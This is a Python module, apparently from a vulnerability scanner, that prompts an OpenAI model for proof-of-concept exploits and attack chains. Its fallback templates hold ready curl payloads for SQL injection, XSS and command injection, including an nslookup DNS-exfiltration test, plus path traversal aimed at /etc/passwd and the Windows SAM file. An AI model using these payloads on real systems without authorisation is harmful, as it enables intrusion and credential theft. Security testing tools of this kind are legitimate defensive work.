"""
AI-Powered Exploit Generator for educational and defensive purposes
Generates proof-of-concept code to validate vulnerabilities
"""
import asyncio
import json
from typing import Dict, List, Any, Optional
from datetime import datetime
import logging

import openai
from app.config import settings

logger = logging.getLogger(__name__)

class ExploitGenerator:
    """
    Generates proof-of-concept exploits for discovered vulnerabilities
    IMPORTANT: For defensive security testing only
    """
    
    def __init__(self):
        self.client = openai.AsyncOpenAI(api_key=settings.openai_api_key) if settings.openai_api_key else None
        self.model = "gpt-4-turbo"
        self.fallback_model = "gpt-3.5-turbo"
        
    async def generate_exploits(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """
        Generate PoC exploits for given vulnerabilities
        """
        if not self.client:
            return self._generate_fallback_exploits(vulnerabilities)
            
        logger.info(f"[EXPLOIT] Generating PoCs for {len(vulnerabilities)} vulnerabilities")
        
        exploits = []
        
        for vuln in vulnerabilities[:5]:  # Limit to top 5 for performance
            try:
                exploit = await self._generate_single_exploit(vuln)
                if exploit:
                    exploits.append(exploit)
            except Exception as e:
                logger.error(f"[EXPLOIT] Failed to generate exploit: {str(e)}")
                
        return {
            "exploits": exploits,
            "total_generated": len(exploits),
            "generation_time": datetime.now().isoformat(),
            "disclaimer": "These PoCs are for defensive testing only. Use only on systems you own or have permission to test."
        }
        
    async def _generate_single_exploit(self, vulnerability: Dict) -> Optional[Dict]:
        """
        Generate a single exploit PoC
        """
        prompt = self._build_exploit_prompt(vulnerability)
        
        try:
            response = await self.client.chat.completions.create(
                model=self.model,
                messages=[
                    {
                        "role": "system",
                        "content": """You are a defensive security expert generating proof-of-concept code 
                        to help organizations validate and fix vulnerabilities. 
                        
                        IMPORTANT GUIDELINES:
                        1. Generate ONLY defensive PoCs for validation purposes
                        2. Include clear disclaimers about responsible usage
                        3. Focus on demonstrating the vulnerability, not causing damage
                        4. Include remediation guidance
                        5. Never generate actual malware or destructive code
                        
                        Your PoCs should be educational and help security teams understand risks."""
                    },
                    {
                        "role": "user",
                        "content": prompt
                    }
                ],
                temperature=0.3,
                max_tokens=1500,
                timeout=30
            )
            
            content = response.choices[0].message.content
            
            # Parse response
            try:
                exploit_data = json.loads(content)
            except json.JSONDecodeError:
                # Try to extract JSON from response
                import re
                json_match = re.search(r'```(?:json)?\s*(\{.*\})\s*```', content, re.DOTALL)
                if json_match:
                    exploit_data = json.loads(json_match.group(1))
                else:
                    exploit_data = self._parse_unstructured_exploit(content, vulnerability)
                    
            return exploit_data
            
        except Exception as e:
            logger.error(f"[EXPLOIT] Generation failed: {str(e)}")
            return None
            
    def _build_exploit_prompt(self, vulnerability: Dict) -> str:
        """
        Build prompt for exploit generation
        """
        vuln_name = vulnerability.get("template_name", "Unknown")
        severity = vulnerability.get("severity", "Unknown")
        description = vulnerability.get("description", "No description")
        cve_id = vulnerability.get("cve_id", [])
        matched_at = vulnerability.get("matched_at", "")
        
        prompt = f"""
        Generate a proof-of-concept (PoC) for the following vulnerability:
        
        Vulnerability: {vuln_name}
        Severity: {severity}
        Description: {description}
        CVE IDs: {', '.join(cve_id) if cve_id else 'None'}
        Found at: {matched_at}
        
        Create a JSON response with:
        {{
            "exploit_name": "Name of the PoC",
            "vulnerability_targeted": "Which vulnerability this exploits",
            "severity": "CRITICAL/HIGH/MEDIUM/LOW",
            "exploit_type": "Type of exploit (e.g., RCE, SQLi, XSS, etc.)",
            "prerequisites": ["List of requirements to run this PoC"],
            "poc_code": "The actual PoC code (prefer curl commands or simple scripts)",
            "execution_steps": ["Step by step how to use this PoC"],
            "expected_result": "What happens if vulnerable",
            "indicators_of_success": ["How to know if the exploit worked"],
            "remediation": "How to fix this vulnerability",
            "references": ["Links to additional information"],
            "disclaimer": "Legal and ethical usage disclaimer"
        }}
        
        IMPORTANT: 
        - Generate ONLY defensive PoCs for validation
        - Use curl commands or simple scripts when possible
        - Never generate destructive payloads
        - Include clear success indicators
        - Focus on proving the vulnerability exists, not exploiting it
        """
        
        return prompt
        
    def _parse_unstructured_exploit(self, content: str, vulnerability: Dict) -> Dict:
        """
        Parse unstructured response into exploit format
        """
        return {
            "exploit_name": f"PoC for {vulnerability.get('template_name', 'Unknown')}",
            "vulnerability_targeted": vulnerability.get('template_name', 'Unknown'),
            "severity": vulnerability.get('severity', 'UNKNOWN'),
            "exploit_type": "Unknown",
            "prerequisites": ["Manual review required"],
            "poc_code": content[:1000] if len(content) > 1000 else content,
            "execution_steps": ["Review the generated content manually"],
            "expected_result": "Vulnerability validation",
            "indicators_of_success": ["Manual verification required"],
            "remediation": vulnerability.get('remediation', 'Apply security patches'),
            "references": vulnerability.get('reference', []),
            "disclaimer": "For defensive testing only",
            "raw_response": content
        }
        
    def _generate_fallback_exploits(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """
        Generate basic exploits without AI
        """
        exploits = []
        
        for vuln in vulnerabilities[:3]:
            exploit = self._generate_basic_poc(vuln)
            if exploit:
                exploits.append(exploit)
                
        return {
            "exploits": exploits,
            "total_generated": len(exploits),
            "generation_time": datetime.now().isoformat(),
            "generation_method": "fallback",
            "disclaimer": "These are basic PoCs. Manual review recommended."
        }
        
    def _generate_basic_poc(self, vulnerability: Dict) -> Dict:
        """
        Generate basic PoC based on vulnerability type
        """
        template_name = vulnerability.get("template_name", "").lower()
        matched_at = vulnerability.get("matched_at", "")
        severity = vulnerability.get("severity", "UNKNOWN")
        
        # SQL Injection PoC
        if "sql" in template_name or "sqli" in template_name:
            return {
                "exploit_name": "SQL Injection PoC",
                "vulnerability_targeted": vulnerability.get("template_name"),
                "severity": severity,
                "exploit_type": "SQL Injection",
                "prerequisites": ["Target must be vulnerable to SQL injection"],
                "poc_code": f"""
# Basic SQL Injection test
curl -X GET "{matched_at}?id=1' OR '1'='1" -v

# Time-based blind SQL injection
curl -X GET "{matched_at}?id=1' AND SLEEP(5)--" -v

# Union-based SQL injection
curl -X GET "{matched_at}?id=1' UNION SELECT NULL,NULL,NULL--" -v
                """.strip(),
                "execution_steps": [
                    "1. Run the curl commands",
                    "2. Check for SQL errors in response",
                    "3. Monitor response times for time-based tests"
                ],
                "expected_result": "SQL errors or delayed responses indicate vulnerability",
                "indicators_of_success": [
                    "SQL error messages in response",
                    "5-second delay for time-based test",
                    "Different response for union queries"
                ],
                "remediation": "Use parameterized queries, input validation, and prepared statements",
                "references": ["https://owasp.org/www-community/attacks/SQL_Injection"],
                "disclaimer": "For authorized testing only"
            }
            
        # XSS PoC
        elif "xss" in template_name or "cross-site" in template_name:
            return {
                "exploit_name": "XSS Validation PoC",
                "vulnerability_targeted": vulnerability.get("template_name"),
                "severity": severity,
                "exploit_type": "Cross-Site Scripting",
                "prerequisites": ["Web browser", "Target accepts user input"],
                "poc_code": f"""
# Reflected XSS test
curl -X GET "{matched_at}?q=<script>alert('XSS')</script>" -v

# DOM XSS test
curl -X GET "{matched_at}#<img src=x onerror=alert('XSS')>" -v

# Stored XSS test (POST request)
curl -X POST "{matched_at}" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "comment=<script>alert('XSS')</script>" -v
                """.strip(),
                "execution_steps": [
                    "1. Execute the curl commands",
                    "2. Check if script tags appear in response",
                    "3. Test in browser for actual execution"
                ],
                "expected_result": "Unescaped script tags in response",
                "indicators_of_success": [
                    "Script tags visible in HTML response",
                    "Alert box appears in browser",
                    "JavaScript execution confirmed"
                ],
                "remediation": "Encode output, use Content Security Policy, validate input",
                "references": ["https://owasp.org/www-community/attacks/xss/"],
                "disclaimer": "Test only on authorized systems"
            }
            
        # Command Injection PoC
        elif "command" in template_name or "rce" in template_name:
            return {
                "exploit_name": "Command Injection PoC",
                "vulnerability_targeted": vulnerability.get("template_name"),
                "severity": severity,
                "exploit_type": "Remote Code Execution",
                "prerequisites": ["Target processes user input in system commands"],
                "poc_code": f"""
# Basic command injection tests
curl -X GET "{matched_at}?file=test.txt;id" -v
curl -X GET "{matched_at}?file=test.txt|id" -v
curl -X GET "{matched_at}?file=test.txt&&id" -v

# Time-based command injection
curl -X GET "{matched_at}?file=test.txt;sleep 5" -v

# DNS exfiltration test (replace YOUR_DOMAIN)
curl -X GET "{matched_at}?file=test.txt;nslookup YOUR_DOMAIN" -v
                """.strip(),
                "execution_steps": [
                    "1. Execute curl commands",
                    "2. Monitor for command output in response",
                    "3. Check for time delays",
                    "4. Monitor DNS logs if testing exfiltration"
                ],
                "expected_result": "Command output in response or timing differences",
                "indicators_of_success": [
                    "System command output visible",
                    "5-second delay observed",
                    "DNS queries received"
                ],
                "remediation": "Never pass user input to system commands, use allow-lists, escape shell arguments",
                "references": ["https://owasp.org/www-community/attacks/Command_Injection"],
                "disclaimer": "Authorized testing only - RCE is highly dangerous"
            }
            
        # Path Traversal PoC
        elif "traversal" in template_name or "lfi" in template_name:
            return {
                "exploit_name": "Path Traversal PoC",
                "vulnerability_targeted": vulnerability.get("template_name"),
                "severity": severity,
                "exploit_type": "Local File Inclusion",
                "prerequisites": ["Target accepts file path parameters"],
                "poc_code": f"""
# Linux path traversal tests
curl -X GET "{matched_at}?file=../../../../etc/passwd" -v
curl -X GET "{matched_at}?file=....//....//....//etc/passwd" -v
curl -X GET "{matched_at}?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64" -v

# Windows path traversal tests
curl -X GET "{matched_at}?file=..\\..\\..\\..\\windows\\system32\\config\\sam" -v
curl -X GET "{matched_at}?file=....\\\\....\\\\....\\\\windows\\\\win.ini" -v
                """.strip(),
                "execution_steps": [
                    "1. Run curl commands",
                    "2. Check for file contents in response",
                    "3. Try different encoding methods"
                ],
                "expected_result": "System file contents in response",
                "indicators_of_success": [
                    "/etc/passwd contents visible",
                    "Windows system files accessible",
                    "Successful directory traversal"
                ],
                "remediation": "Validate file paths, use allow-lists, chroot jail, disable directory listing",
                "references": ["https://owasp.org/www-community/attacks/Path_Traversal"],
                "disclaimer": "Authorized testing only"
            }
            
        # Generic PoC
        else:
            return {
                "exploit_name": f"Generic PoC for {vulnerability.get('template_name', 'Unknown')}",
                "vulnerability_targeted": vulnerability.get("template_name"),
                "severity": severity,
                "exploit_type": "Generic",
                "prerequisites": ["Manual analysis required"],
                "poc_code": f"""
# Generic vulnerability test
curl -X GET "{matched_at}" -v -H "User-Agent: PHANTOM-Security-Scanner"

# Check response headers and body for indicators
# Manual testing required based on vulnerability type
                """.strip(),
                "execution_steps": [
                    "1. Analyze the vulnerability details",
                    "2. Craft appropriate test payload",
                    "3. Execute and monitor response"
                ],
                "expected_result": "Vulnerability-specific indicators",
                "indicators_of_success": ["Manual verification required"],
                "remediation": vulnerability.get("remediation", "Apply security best practices"),
                "references": vulnerability.get("reference", []),
                "disclaimer": "Manual review and customization required"
            }
            
    async def generate_attack_chain(self, vulnerabilities: List[Dict], 
                                  target_info: Dict) -> Dict[str, Any]:
        """
        Generate a complete attack chain showing how vulnerabilities could be chained
        """
        if not self.client:
            return self._generate_basic_attack_chain(vulnerabilities)
            
        prompt = f"""
        Based on these vulnerabilities found on {target_info.get('target', 'the target')}:
        
        {json.dumps([{
            'name': v.get('template_name'),
            'severity': v.get('severity'),
            'location': v.get('matched_at')
        } for v in vulnerabilities[:10]], indent=2)}
        
        Generate a realistic attack chain showing how an attacker might combine these vulnerabilities.
        
        Format as JSON:
        {{
            "attack_chain_name": "Name for this attack scenario",
            "objective": "What the attacker aims to achieve",
            "difficulty": "LOW/MEDIUM/HIGH",
            "time_to_exploit": "Estimated time",
            "attack_phases": [
                {{
                    "phase": 1,
                    "name": "Phase name",
                    "description": "What happens in this phase",
                    "vulnerabilities_used": ["List of vulns used"],
                    "tools_required": ["Tools needed"],
                    "success_indicators": ["How to know it worked"]
                }}
            ],
            "impact": "Business impact if successful",
            "detection_methods": ["How to detect this attack"],
            "prevention": ["How to prevent this attack chain"]
        }}
        """
        
        try:
            response = await self.client.chat.completions.create(
                model=self.model,
                messages=[
                    {"role": "system", "content": "You are a defensive security expert analyzing attack chains."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.5,
                max_tokens=2000
            )
            
            content = response.choices[0].message.content
            return json.loads(content)
            
        except Exception as e:
            logger.error(f"[EXPLOIT] Attack chain generation failed: {str(e)}")
            return self._generate_basic_attack_chain(vulnerabilities)
            
    def _generate_basic_attack_chain(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """
        Generate basic attack chain without AI
        """
        critical_vulns = [v for v in vulnerabilities if v.get("severity", "").upper() == "CRITICAL"]
        high_vulns = [v for v in vulnerabilities if v.get("severity", "").upper() == "HIGH"]
        
        phases = []
        
        # Phase 1: Reconnaissance
        phases.append({
            "phase": 1,
            "name": "Initial Reconnaissance",
            "description": "Attacker gathers information about the target",
            "vulnerabilities_used": ["Information disclosure", "Missing security headers"],
            "tools_required": ["nmap", "curl", "browser"],
            "success_indicators": ["Target infrastructure mapped", "Technologies identified"]
        })
        
        # Phase 2: Initial Access
        if critical_vulns or high_vulns:
            vuln = (critical_vulns + high_vulns)[0]
            phases.append({
                "phase": 2,
                "name": "Gain Initial Access",
                "description": f"Exploit {vuln.get('template_name', 'vulnerability')} to gain access",
                "vulnerabilities_used": [vuln.get('template_name')],
                "tools_required": ["Custom exploit", "Metasploit"],
                "success_indicators": ["Shell access obtained", "Authentication bypassed"]
            })
            
        # Phase 3: Privilege Escalation
        phases.append({
            "phase": 3,
            "name": "Escalate Privileges",
            "description": "Elevate access to administrative level",
            "vulnerabilities_used": ["Local privilege escalation", "Misconfigurations"],
            "tools_required": ["LinPEAS", "WinPEAS", "Custom scripts"],
            "success_indicators": ["Root/Admin access achieved"]
        })
        
        # Phase 4: Persistence
        phases.append({
            "phase": 4,
            "name": "Establish Persistence",
            "description": "Maintain access to the compromised system",
            "vulnerabilities_used": ["Weak access controls", "Missing monitoring"],
            "tools_required": ["Backdoors", "Scheduled tasks", "Web shells"],
            "success_indicators": ["Persistent access established", "Backdoor functional"]
        })
        
        return {
            "attack_chain_name": "Multi-Stage Compromise Scenario",
            "objective": "Full system compromise with persistent access",
            "difficulty": "MEDIUM" if len(critical_vulns) > 0 else "HIGH",
            "time_to_exploit": "2-4 hours" if len(critical_vulns) > 0 else "1-2 days",
            "attack_phases": phases,
            "impact": "Complete system compromise, data theft, service disruption",
            "detection_methods": [
                "Monitor for unusual network traffic",
                "Check for unauthorized access attempts",
                "Review system logs for exploitation attempts",
                "Deploy IDS/IPS systems",
                "Implement file integrity monitoring"
            ],
            "prevention": [
                "Patch all critical vulnerabilities immediately",
                "Implement defense in depth",
                "Use principle of least privilege",
                "Deploy WAF and network segmentation",
                "Regular security assessments"
            ]
        }